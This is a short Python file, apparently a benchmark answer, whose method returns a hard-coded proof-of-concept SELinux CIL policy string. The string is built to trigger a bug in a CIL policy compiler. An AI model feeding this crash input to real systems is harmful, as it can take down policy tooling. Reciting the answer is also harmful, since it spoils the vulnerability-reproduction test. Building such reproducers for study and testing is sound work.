import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = "(macro m((classpermission cp))(classpermissionset s(cp)))(block b(class c(p))(call m((c(p)))))"
        return poc.encode("utf-8")